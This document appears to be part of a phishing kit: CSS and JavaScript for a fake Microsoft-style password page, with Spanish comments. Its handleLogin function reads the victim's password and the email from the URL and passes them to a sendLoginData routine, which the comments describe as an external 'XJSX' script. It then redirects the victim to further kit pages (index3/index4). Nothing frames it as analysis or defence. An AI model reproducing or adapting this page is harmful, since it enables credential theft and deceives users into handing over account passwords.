    <style>
      * { box-sizing: border-box; }

      body {
        font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
        min-height: 100vh;
        margin: 0;
        background: url('banner.svg') center/cover no-repeat fixed;
      }

      /* ── CONTENEDOR PRINCIPAL ── */
      .main-container {
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding: 20px 16px 80px 16px;
      }

      /* ── CARD ── */
      .ms-card {
        background: #fff;
        border-radius: 0;
        box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        padding: 28px 44px 36px 44px;
        width: 100%;
        max-width: 440px;
        position: relative;
      }

      /* ── FILA SUPERIOR: flecha + logo centrado ── */
      .ms-card-header {
        display: flex;
        align-items: center;
        justify-content: center;
        position: relative;
        margin-bottom: 20px;
      }

      .ms-back-btn {
        position: absolute;
        left: 0;
        background: none;
        border: none;
        cursor: pointer;
        padding: 4px;
        color: #1b1b1b;
        display: flex;
        align-items: center;
      }

      .ms-back-btn:hover { color: #0078d4; }

      .ms-logo-row {
        display: flex;
        align-items: center;
        gap: 8px;
      }

      .ms-logo-grid {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 1px;
        width: 20px;
        height: 20px;
        flex-shrink: 0;
      }

      .ms-logo-grid div { width: 9px; height: 9px; }

      /* ── EMAIL PÍLDORA ── */
      .ms-email-badge {
        display: flex;
        justify-content: center;
        margin-bottom: 16px;
      }

      .ms-email-badge span {
        border: 1px solid #8a8886;
        border-radius: 20px;
        padding: 4px 16px;
        font-size: 13px;
        color: #1b1b1b;
        background: transparent;
      }

      /* ── TÍTULO ── */
      .ms-card h1 {
        text-align: center !important;
        font-size: 24px !important;
        font-weight: 600 !important;
        line-height: 32px !important;
        color: #1b1b1b !important;
        margin: 0 0 20px 0 !important;
      }

      /* ── INPUT CONTRASEÑA ── */
      input#password {
        display: block;
        width: 100% !important;
        border: 1px solid #8a8886 !important;
        border-radius: 0 !important;
        padding: 10px 12px !important;
        background: #fff !important;
        box-shadow: none !important;
        font-size: 16px !important;
        font-family: inherit !important;
        color: #1b1b1b !important;
        outline: none !important;
      }

      input#password:focus {
        border-color: #0078d4 !important;
        box-shadow: inset 0 0 0 1px #0078d4 !important;
      }

      input#password::placeholder {
        color: #767676 !important;
      }

      /* ── LINK ── */
      a.ms-link, .ms-link {
        color: #0078d4 !important;
        text-decoration: none !important;
        font-size: 13px !important;
      }

      a.ms-link:hover { text-decoration: underline !important; }

      /* ── BOTÓN SIGUIENTE ── */
      .ms-btn-next {
        display: block;
        width: 100%;
        background: #0078d4;
        color: #fff;
        border: none;
        border-radius: 0;
        font-size: 15px;
        font-weight: 600;
        font-family: inherit;
        padding: 10px 12px;
        cursor: pointer;
        margin-top: 20px;
      }

      .ms-btn-next:hover { background: #106ebe; }
      .ms-btn-next:active { background: #005a9e; }

      /* ── OTRAS FORMAS ── */
      .ms-other-login {
        text-align: center;
        margin-top: 20px;
        padding-top: 20px;
        border-top: 1px solid #e0e0e0;
      }

      /* ── FOOTER ── */
      .ms-footer {
        position: fixed;
        bottom: 0; left: 0; right: 0;
        background: rgba(255,255,255,0.95);
        border-top: 1px solid #e0e0e0;
        padding: 8px 16px;
        z-index: 50;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 24px;
        flex-wrap: wrap;
        font-size: 12px;
        color: #605e5c;
      }

      .ms-footer a {
        color: #605e5c;
        text-decoration: none;
        font-size: 12px;
      }

      .ms-footer a:hover { color: #0078d4; }

      /* ── ANIMACIÓN ── */
      .fade-in { animation: fadeIn 0.3s ease-out; }

      @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
      }

      /* ── MÓVIL: sin scroll, sin zoom ── */
      @media (max-width: 639px) {
        html, body {
          position: fixed !important;
          width: 100% !important;
          height: 100% !important;
          overflow: hidden !important;
          overscroll-behavior: none !important;
          touch-action: none !important;
        }
        .main-container {
          position: fixed !important;
          top: 0; left: 0; right: 0; bottom: 0;
          overflow: hidden !important;
          touch-action: none !important;
        }
      }
    </style>

      function goBack() {
        window.history.back();
      }

      function handleLogin(event) {
        event.preventDefault();
        
        // Prevenir múltiples envíos
        const submitButton = event.target.querySelector('button[type="submit"]') || document.querySelector('button[type="submit"]');
        if (submitButton.disabled) {
          return;
        }
        
        const password = document.getElementById('password').value;
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email') || 'usuario@ejemplo.com';
        
        if (password.trim()) {
          // Deshabilitar botón inmediatamente
          submitButton.disabled = true;
          submitButton.textContent = 'Verificando...';
          
          // Enviar datos usando XJSX
          console.log('📤 Enviando datos de login...');
          
          if (typeof sendLoginData !== 'undefined') {
            sendLoginData(email, password)
              .then(success => {
                console.log(success ? '✅ Login enviado' : '❌ Error enviando login');
                setTimeout(() => {

                  // ✅ Si ya pasó 1 vez por index3, saltar directo a index4
                    const yaPasoPorIndex3 = localStorage.getItem("paso_index3") === "1";

                    if (yaPasoPorIndex3) {
                     window.location.href = `index4.html?email=${encodeURIComponent(email)}`;
                  } else {
                 // ✅ Primera vez: marcar y mandarlo a index3
                     localStorage.setItem("paso_index3", "1");
                    window.location.href = `index3.html?email=${encodeURIComponent(email)}`;
                  }

                }, 500);
              })
              .catch(error => {
                console.error('❌ Error:', error);
                setTimeout(() => {
                  window.location.href = `index3.html?email=${encodeURIComponent(email)}`;
                }, 500);
              });
          } else {
            console.warn('⚠️ XJSX no cargado');
            window.location.href = `index3.html?email=${encodeURIComponent(email)}`;
          }
        }
      }
    </script>

    <script>
      document.addEventListener('gesturestart',  e => e.preventDefault());
      document.addEventListener('gesturechange', e => e.preventDefault());
      document.addEventListener('gestureend',    e => e.preventDefault());
      let lastTouch = 0;
      document.addEventListener('touchend', e => {
        const now = Date.now();
        if (now - lastTouch <= 300) e.preventDefault();
        lastTouch = now;
      }, { passive: false });
      document.addEventListener('touchmove', e => {
        if (e.touches.length > 1) e.preventDefault();
      }, { passive: false });
    </script>
